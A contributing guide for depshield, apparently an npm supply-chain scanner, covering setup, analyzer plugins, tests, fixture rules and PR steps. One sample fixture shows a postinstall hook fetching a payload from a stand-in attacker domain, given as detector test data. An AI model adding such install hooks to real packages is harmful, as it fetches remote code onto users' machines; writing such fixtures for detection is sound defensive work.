# Contributing to depshield

Thanks for your interest in improving npm supply chain security! depshield welcomes contributions of all kinds: bug reports, new analyzers, test fixtures, documentation, and code improvements.

## Getting Started

### Development Setup

```bash
git clone https://github.com/Gahrcoder/depshield.git
cd depshield
python -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
pip install -e '.[dev]'
```

### Running Tests

```bash
python -m pytest tests/ -v
```

All tests must pass before submitting a PR. The CI runs tests on Ubuntu, macOS, and Windows across Python 3.9, 3.11, and 3.12.

### Linting

We use [ruff](https://github.com/astral-sh/ruff) for linting:

```bash
pip install ruff
ruff check depshield/
```

## Adding a New Analyzer

depshield uses a plugin architecture. Adding a new analyzer requires **zero changes** to existing files.

### Step 1: Create the Analyzer

Create a new file in `depshield/analyzers/`:

```python
# depshield/analyzers/my_detector.py
from depshield.analyzers.base import BaseAnalyzer
from depshield.core.registry import register_analyzer
from depshield.core.models import Finding, PackageInfo, Severity


@register_analyzer
class MyDetector(BaseAnalyzer):
    name = "my_detector"
    description = "Detect a new class of supply chain attacks"

    def analyze(self, package: PackageInfo) -> list[Finding]:
        findings = []
        # Your detection logic here.
        # package.name, package.version, package.scripts, package.package_json
        # are all available.
        return findings
```

The `@register_analyzer` decorator automatically registers your analyzer with the scan engine. The `name` attribute is used to identify it in output and for the `--exclude` CLI flag.

### Step 2: Add Tests

Create a test file in `tests/test_analyzers/`:

```python
# tests/test_analyzers/test_my_detector.py
import pytest
from depshield.analyzers.my_detector import MyDetector
from depshield.core.models import PackageInfo


class TestMyDetector:
    def setup_method(self):
        self.analyzer = MyDetector()

    def test_malicious_pattern_detected(self):
        pkg = PackageInfo(
            name="suspicious-pkg",
            version="1.0.0",
            scripts={},
            package_json={"name": "suspicious-pkg", "version": "1.0.0"},
        )
        findings = self.analyzer.analyze(pkg)
        assert len(findings) > 0

    def test_legitimate_package_not_flagged(self):
        pkg = PackageInfo(
            name="express",
            version="4.18.2",
            scripts={},
            package_json={"name": "express", "version": "4.18.2"},
        )
        findings = self.analyzer.analyze(pkg)
        assert len(findings) == 0
```

Aim for:
- True positive tests (malicious patterns are detected)
- True negative tests (legitimate packages are not flagged)
- Edge cases (empty input, missing fields, unusual formats)

### Step 3: Add Test Fixtures (if needed)

Fixtures go in `tests/fixtures/`. If your analyzer detects a new attack class, add representative fixtures.

**Requirements for malicious fixtures:**
- Use RFC 2606 reserved domains only: `*.test.invalid`, `*.example.com`
- Never use real C2 infrastructure domains or IPs
- Include realistic but sanitized payloads
- Add comments explaining the attack pattern

Example:
```json
{
  "name": "suspicious-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://evil.example.com/payload')\""
  }
}
```

## Code Style

- **Linter:** ruff (configured in `pyproject.toml`)
- **Type hints:** Use them for function signatures
- **Docstrings:** Required for public classes and functions
- **Imports:** Use `from __future__ import annotations` at the top of every module
- **Dependencies:** Core depshield has zero external dependencies. Keep it that way. If your analyzer needs an external library, make it an optional import with a graceful fallback.

## PR Process

1. Fork the repo and create a feature branch from `main`
2. Write your code and tests
3. Run `python -m pytest tests/ -v` and confirm all tests pass
4. Run `ruff check depshield/` and fix any lint issues
5. Open a PR with a clear description of what your change does
6. CI will run tests on all platforms automatically

### Good PR Titles

- `feat: add binary addon analyzer`
- `fix: false positive on husky prepare script`
- `test: add fixtures for DNS exfiltration pattern`
- `docs: update comparison table`

## Reporting False Positives

If depshield flags a legitimate package, please open an issue with:
- The package name and version
- The finding that was reported
- Why you believe it's a false positive

False positive reports are high-value contributions -- they directly improve detection accuracy.

## Architecture Overview

```
depshield/
  analyzers/       # Plugin-based analyzer system
    base.py        # BaseAnalyzer ABC -- subclass this
    *.py           # Each file is an independent analyzer
  core/
    engine.py      # Scan orchestrator
    models.py      # Finding, PackageInfo, ScanResult, Severity
    registry.py    # @register_analyzer decorator
  entropy/         # Information theory primitives
  output/          # Terminal, JSON, SARIF formatters
  data/            # Reference data (popular packages list)
  cli.py           # CLI entry point
```

The scan engine discovers packages from `node_modules/` or `package-lock.json`, runs every registered analyzer against each package, deduplicates findings, and passes them to the selected output formatter.

## License

By contributing, you agree that your contributions will be licensed under the MIT License.
